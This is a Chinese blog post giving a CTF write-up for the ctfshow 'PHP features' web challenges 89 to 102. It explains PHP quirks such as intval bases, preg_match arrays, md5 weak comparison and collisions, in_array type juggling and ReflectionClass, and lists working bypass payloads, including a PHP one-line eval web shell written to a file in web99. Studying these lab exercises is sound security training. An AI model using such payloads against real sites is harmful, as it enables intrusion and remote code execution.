<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"yun421.top","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="ctfshow.PHP特性web89 数组绕过正则表达式 12返回值返回完整匹配次数（可能是0），或者如果发生错误返回FALSE。  也就是说如果我们不按规定传一个字符串，而是数组的话，就会返回false，从而不会进入if payload:num[]&#x3D;1">
<meta property="og:type" content="article">
<meta property="og:title" content="ctfshow.PHP特性">
<meta property="og:url" content="http://yun421.top/2022/03/04/ctfshow.PHP%E7%89%B9%E6%80%A7/index.html">
<meta property="og:site_name" content="Yun421">
<meta property="og:description" content="ctfshow.PHP特性web89 数组绕过正则表达式 12返回值返回完整匹配次数（可能是0），或者如果发生错误返回FALSE。  也就是说如果我们不按规定传一个字符串，而是数组的话，就会返回false，从而不会进入if payload:num[]&#x3D;1">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/chrome_Jb5AopKoUw.png">
<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041718914.png">
<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/chrome_IvEwGmF6Iw.png">
<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/chrome_QzRexRF5zf.png">
<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041718064.png">
<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/chrome_NlAabp7Skh.png">
<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/chrome_PQDjIAiOQO.png">
<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041718120.png">
<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/chrome_jVoKZrYSTD.png">
<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/chrome_RaM5M2MzTD.png">
<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041718363.png">
<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041718432.png">
<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/chrome_Amz6uPzInf.png">
<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041718073.png">
<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041718404.png">
<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/chrome_38ppT01WvJ.png">
<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/chrome_WekDb6GAUG.png">
<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041718586.png">
<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041718977.png">
<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/chrome_93ZQjT1xMh.png">
<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041718316.png">
<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041718437.png">
<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/chrome_xS7vGDB3Wo.png">
<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/chrome_X5AnH5a53a.png">
<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/chrome_1mq0dye4nS.png">
<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/chrome_2woolNjJnf.png">
<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041718142.png">
<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/chrome_dOBlWnxqi8.png">
<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041718594.png">
<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041718729.png">
<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041718156.png">
<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/image-20211113171135398.png">
<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/image-20211113172042516.png">
<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/image-20211113172713166.png">
<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041718141.png">
<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/image-20211127175952923.png">
<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/image-20211127181844899.png">
<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041718801.png">
<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/image-20220302154737630.png">
<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041718998.png">
<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/image-20220302185137867.png">
<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/image-20220302185633851.png">
<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/image-20220302185911047.png">
<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/image-20220302190624722.png">
<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041718052.png">
<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041718854.png">
<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/image-20220302210048715.png">
<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/image-20220302210319210.png">
<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/image-20220302212139253.png">
<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/image-20220302212139253.png">
<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041718920.png">
<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/image-20220303172712538.png">
<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041718694.png">
<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041718804.png">
<meta property="article:published_time" content="2022-03-04T09:17:29.000Z">
<meta property="article:modified_time" content="2022-03-04T09:22:02.760Z">
<meta property="article:author" content="Yun421">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://gitee.com/yun421/picgo/raw/master/img/chrome_Jb5AopKoUw.png">

<link rel="canonical" href="http://yun421.top/2022/03/04/ctfshow.PHP%E7%89%B9%E6%80%A7/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>ctfshow.PHP特性 | Yun421</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<link rel="alternate" href="/atom.xml" title="Yun421" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Yun421</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">记录学习中的点点滴滴</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-resources">

    <a href="/resources/" rel="section"><i class="download fa-fw"></i>资源</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yun421.top/2022/03/04/ctfshow.PHP%E7%89%B9%E6%80%A7/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Yun421">
      <meta itemprop="description" content="短暂的热爱过后剩下的是坚持">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Yun421">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          ctfshow.PHP特性
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-03-04 17:17:29 / 修改时间：17:22:02" itemprop="dateCreated datePublished" datetime="2022-03-04T17:17:29+08:00">2022-03-04</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="ctfshow-PHP特性"><a href="#ctfshow-PHP特性" class="headerlink" title="ctfshow.PHP特性"></a>ctfshow.PHP特性</h1><h2 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/chrome_Jb5AopKoUw.png" alt="chrome_Jb5AopKoUw"></p>
<p>数组绕过正则表达式</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">返回值</span><br><span class="line">返回完整匹配次数（可能是<span class="number">0</span>），或者如果发生错误返回<span class="literal">FALSE</span>。</span><br></pre></td></tr></table></figure>

<p>也就是说如果我们不按规定传一个字符串，而是数组的话，就会返回false，从而不会进入if</p>
<p>payload:num[]=1</p>
<span id="more"></span>

<h2 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041718914.png" alt="chrome_gduw5EGYmx"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">intval ( <span class="keyword">mixed</span> <span class="variable">$var</span> [, <span class="keyword">int</span> <span class="variable">$base</span> = <span class="number">10</span> ] ) : <span class="keyword">int</span></span><br><span class="line">Note:</span><br><span class="line">如果 base 是 <span class="number">0</span>，通过检测 <span class="keyword">var</span> 的格式来决定使用的进制：</span><br><span class="line">如果字符串包括了 <span class="string">&quot;0x&quot;</span> (或 <span class="string">&quot;0X&quot;</span>) 的前缀，使用 <span class="number">16</span> 进制 (hex)；否则，</span><br><span class="line">如果字符串以 <span class="string">&quot;0&quot;</span> 开始，使用 <span class="number">8</span> 进制(octal)；否则，</span><br><span class="line">将使用 <span class="number">10</span> 进制 (decimal)</span><br></pre></td></tr></table></figure>

<p>payload：num=4476.</p>
<h2 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/chrome_IvEwGmF6Iw.png" alt="chrome_IvEwGmF6Iw"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">正则表达式修饰符</span><br><span class="line"></span><br><span class="line">i </span><br><span class="line">不区分(ignore)大小写</span><br><span class="line">m</span><br><span class="line">多(more)行匹配</span><br><span class="line">若存在换行\n并且有开始^或结束$符的情况下，将以换行为分隔符，逐行进行匹配</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;abc\nabc&quot;</span>;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&quot;/^abc$/m&quot;</span>;</span><br><span class="line">preg_match(<span class="variable">$preg</span>, <span class="variable">$str</span>,<span class="variable">$matchs</span>);</span><br><span class="line">这样其实是符合正则表达式的，因为匹配的时候 先是匹配换行符前面的，接着匹配换行符后面的，两个都是abc所以可以通过正则表达式。</span><br><span class="line"></span><br><span class="line">s</span><br><span class="line">特殊字符圆点 . 中包含换行符</span><br><span class="line">默认的圆点 . 是匹配除换行符 \n 之外的任何单字符，加上s之后, .包含换行符</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;abggab\nacbs&quot;</span>;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&quot;/b./s&quot;</span>;</span><br><span class="line">preg_match_all(<span class="variable">$preg</span>, <span class="variable">$str</span>,<span class="variable">$matchs</span>);</span><br><span class="line">这样匹配到的有三个 bg b\n bs</span><br><span class="line">A</span><br><span class="line">强制从目标字符串开头匹配;</span><br><span class="line">D</span><br><span class="line">如果使用$限制结尾字符,则不允许结尾有换行; </span><br><span class="line">e</span><br><span class="line">配合函数preg_replace()使用, 可以把匹配来的字符串当作正则表达式执行; </span><br></pre></td></tr></table></figure>

<p>可以通过换行绕过第二个判断</p>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=%<span class="number">0</span>aphp			%<span class="number">0</span>a就是表示换行</span><br></pre></td></tr></table></figure>

<p>%0aphp 经过第一个匹配时，以换行符为分割也就是%0a，前面因为是空的，所以只匹配换行符后面的，所以可以通过。<br>经过第二个正则表达式时，因为我们是%0aphp 不符合正则表达式的以php开头以php结尾。所以无法通过，最后输出flag</p>
<h2 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/chrome_QzRexRF5zf.png" alt="chrome_QzRexRF5zf"></p>
<p>两层判断，第一层不能是4476，第二层取整，于是直接小数点绕过</p>
<p>payload：num=4476.1</p>
<h2 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041718064.png" alt="chrome_jMEnq13pgy"></p>
<p>多过滤了字母，不影响操作</p>
<p>payload：num=4476.1</p>
<h2 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/chrome_NlAabp7Skh.png" alt="chrome_NlAabp7Skh"></p>
<p>strpos函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">strpos — 查找字符串首次出现的位置</span><br><span class="line">也就是说num中必须出现<span class="number">0</span>，且<span class="number">0</span>不能出现在第一位，因为如果出现在第一位则strpos返回<span class="number">0</span>，<span class="number">0</span>取反条件成立执行<span class="keyword">die</span></span><br><span class="line">strpos() 函数对大小写敏感    </span><br></pre></td></tr></table></figure>

<p>这个不影响操作，小数里写个0就可以了</p>
<p>payload：num=4476.0</p>
<h2 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/chrome_PQDjIAiOQO.png" alt="chrome_PQDjIAiOQO"></p>
<p>把小数点过滤了</p>
<p>用8进制绕过一下</p>
<p>payload：num= 010574</p>
<h2 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041718120.png" alt="chrome_5vTOQBAn5N"></p>
<p>路径问题<br>下面方式在highlight_file中均等效于flag.php，也即本题的payload</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/flag.php              绝对路径</span><br><span class="line">./flag.php                          相对路径</span><br><span class="line">php://filter/resource=flag.php      php伪协议</span><br></pre></td></tr></table></figure>



<h2 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/chrome_jVoKZrYSTD.png" alt="chrome_jVoKZrYSTD"></p>
<p>POST传入a,b,要求两变量的值不相同，但是MD5后的值相同</p>
<p>数组类型绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：a[]=<span class="number">1</span>&amp;b[]=<span class="number">2</span></span><br></pre></td></tr></table></figure>



<h4 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h4><p>​                                                                                                              <strong>–摘取自<a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/109168454">https://blog.csdn.net/miuzzx/article/details/109168454</a></strong></p>
<p>md5弱比较,使用了强制类型转换后不再接收数组</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$a=(string)$a;</span><br><span class="line">$b=(string)$b;</span><br><span class="line"><span class="keyword">if</span>(  ($a!==$b) &amp;&amp; (md5($a)==md5($b)) )&#123;</span><br><span class="line">echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">md5弱比较，为<span class="number">0</span>e开头的会被识别为科学记数法，结果均为<span class="number">0</span>，所以只需找两个md5后都为<span class="number">0</span>e开头且<span class="number">0</span>e后面均为数字的值即可。</span><br><span class="line">payload: a=QNKCDZO&amp;b=<span class="number">240610708</span></span><br></pre></td></tr></table></figure>

<p>md5强碰撞</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$a=(string)$a;</span><br><span class="line">$b=(string)$b;</span><br><span class="line"><span class="keyword">if</span>(  ($a!==$b) &amp;&amp; (md5($a)===md5($b)) )&#123;</span><br><span class="line">echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">这时候需要找到两个真正的md5值相同数据</span><br><span class="line"></span><br><span class="line">a=M%C9h%FF%<span class="number">0</span>E%E3%<span class="number">5</span>C%<span class="number">20</span>%<span class="number">95</span>r%D4w%<span class="number">7</span>Br%<span class="number">15</span>%<span class="number">87</span>%D3o%A7%B2%<span class="number">1</span>B%DCV%B7J%<span class="number">3</span>D%C0x%<span class="number">3</span>E%<span class="number">7</span>B%<span class="number">95</span>%<span class="number">18</span>%AF%BF%A2%<span class="number">00</span>%A8%<span class="number">28</span>K%F3n%<span class="number">8</span>EKU%B3_Bu%<span class="number">93</span>%D8Igm%A0%D1U%<span class="number">5</span>D%<span class="number">83</span>%<span class="number">60</span>%FB_%<span class="number">07</span>%FE%A2&amp;b=M%C9h%FF%<span class="number">0</span>E%E3%<span class="number">5</span>C%<span class="number">20</span>%<span class="number">95</span>r%D4w%<span class="number">7</span>Br%<span class="number">15</span>%<span class="number">87</span>%D3o%A7%B2%<span class="number">1</span>B%DCV%B7J%<span class="number">3</span>D%C0x%<span class="number">3</span>E%<span class="number">7</span>B%<span class="number">95</span>%<span class="number">18</span>%AF%BF%A2%<span class="number">02</span>%A8%<span class="number">28</span>K%F3n%<span class="number">8</span>EKU%B3_Bu%<span class="number">93</span>%D8Igm%A0%D1%D5%<span class="number">5</span>D%<span class="number">83</span>%<span class="number">60</span>%FB_%<span class="number">07</span>%FE%A2</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/chrome_RaM5M2MzTD.png" alt="chrome_RaM5M2MzTD"></p>
<p>三目运算符</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">表达式 (expr1) ? (expr2) : (expr3) 在 expr1 求值为 true 时的值为 expr2，在 expr1 求值为 false 时的值为 expr3</span><br><span class="line">可以省略三目运算符中间那部分。表达式 expr1 ?: expr3 在 expr1 求值为 true 时返回 expr1，否则返回 expr3</span><br></pre></td></tr></table></figure>

<p>根据第一条可知，如果get传了一个值，那么就可以用post覆盖get中的值<br>最后一行是,如果get传了一个HTTP_FLAG=flag就输出flag否则显示index.php源码<br>所以我们get随便传一个，然后post传 HTTP_FLAG=flag即可</p>
<p>payload：</p>
<p>get：1 </p>
<p>post：HTTP_FLAG=flag</p>
<h2 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041718363.png" alt="chrome_o4rUHC9XAU"></p>
<p>上边的for就是生成了一个有数字组成的数组</p>
<p>php弱类型比较</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$allow = array(<span class="number">1</span>,<span class="comment">&#x27;2&#x27;,&#x27;3&#x27;);</span></span><br><span class="line">var_dump(in_array(<span class="comment">&#x27;1.php&#x27;,$allow));</span></span><br><span class="line">返回的为true</span><br><span class="line"></span><br><span class="line">$allow = array(<span class="comment">&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;);</span></span><br><span class="line">var_dump(in_array(<span class="comment">&#x27;1.php&#x27;,$allow));</span></span><br><span class="line">返回false</span><br></pre></td></tr></table></figure>

<p>payload：</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">get</span>：n=<span class="number">1</span>.php </span><br><span class="line">post：content=&lt;?php eval($_POST[<span class="number">1</span>]);?&gt;</span><br></pre></td></tr></table></figure>

<p>后面命令执行了</p>
<h2 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041718432.png" alt="chrome_macamcSN0m"></p>
<p>我们看这个题get传入v1,v2,v3，v0即满足v1为数字即可。</p>
<p>and和&amp;&amp;的区别：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="literal">true</span> <span class="keyword">and</span> <span class="literal">false</span> <span class="keyword">and</span> <span class="literal">false</span>;</span><br><span class="line">var_dump(<span class="variable">$a</span>);  返回<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="literal">true</span> &amp;&amp; <span class="literal">false</span> &amp;&amp; <span class="literal">false</span>;</span><br><span class="line">var_dump(<span class="variable">$a</span>);  返回<span class="literal">false</span></span><br></pre></td></tr></table></figure>

<p>题目上的注释告诉我们一个知识反射类</p>
<p>直接输出 ctfshow 类即可，也就是构造出  echo new ReflectionClass(‘ctfshow’); payload: ?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</p>
<p>payload：v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</p>
<p>得到flag为ctfshow{5b08f63b0x2d96ec0x2d498d0x2da78a0x2d084356355690},注意将0x2d转换为-，</p>
<p>ctfshow{5b08f63b-96ec-498d-a78a-084356355690}</p>
<h2 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/chrome_Amz6uPzInf.png" alt="chrome_Amz6uPzInf"></p>
<p>前面和上一题都一样，v2被过滤了</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|\|/|~|`|!|@|#|$|%|^|*|)|-|_|+|=|&#123;|[|<span class="string">&quot;|&#x27;|,|.|;|?|[0-9]|</span></span><br></pre></td></tr></table></figure>

<p>v3过滤了</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|\|/|~|`|!|@|#|$|%|^|*|)|-|_|+|=|&#123;|[|<span class="string">&quot;|&#x27;|,|.|?|[0-9]|</span></span><br></pre></td></tr></table></figure>

<p>比v2少一个|;|,发现这些过滤不影响操作</p>
<p>所以操作同上</p>
<p>payload：v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</p>
<p>得到flag为ctfshow{ceceb8250x2d8cc20x2d4cad0x2d8c210x2d7dc29013d3a},注意将0x2d转换为-，</p>
<p>ctfshow{ceceb825-8cc2-4cad-8c21-7dc29013d3a}，flag少最后一位，爆破一下或手动都可</p>
<h2 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041718073.png" alt="chrome_PbRHT1FGsF"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1.is_numeric()</span><br><span class="line">判断是否是数字，is_numeric在php5的环境中，是可以识别十六进制的，也就是说，如果传入v2=0x66也是可以识别为数字的</span><br><span class="line">var_dump(is_numeric(<span class="string">&quot;0x66&quot;</span>));  </span><br><span class="line">// php5的环境下返回<span class="literal">true</span>  php7返回<span class="literal">false</span></span><br><span class="line"></span><br><span class="line">2.substr()</span><br><span class="line">字符串截取函数</span><br><span class="line">substr(<span class="string">&quot;Hello world&quot;</span>,6);</span><br><span class="line">从length长度开始截取默认是直到字符串的结尾</span><br><span class="line">// 输出 world</span><br><span class="line">    </span><br><span class="line">3.call_user_func(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">把第一个参数作为回调函数调用</span><br><span class="line">也就是说<span class="variable">$v1</span>可以是函数名,<span class="variable">$s</span>就是函数的值,就可以调用函数</span><br><span class="line">    </span><br><span class="line">4.file_put_contents(<span class="variable">$v3</span>,<span class="variable">$str</span>)</span><br><span class="line">把str的内容放入v3文件中</span><br></pre></td></tr></table></figure>

<p>利用is_numeric的特性传入一个十六进制数,通过substr函数时 0x 会被截去, call_user_func 函数处调用 hex2bin 函数将16进制转换成字符串写入文件中</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hex2bin()</span><br><span class="line">转换十六进制字符串为二进制字符串</span><br><span class="line">hex2bin如果参数带<span class="number">0</span>x会报错</span><br></pre></td></tr></table></figure>

<p>将一句话编码成16进制</p>
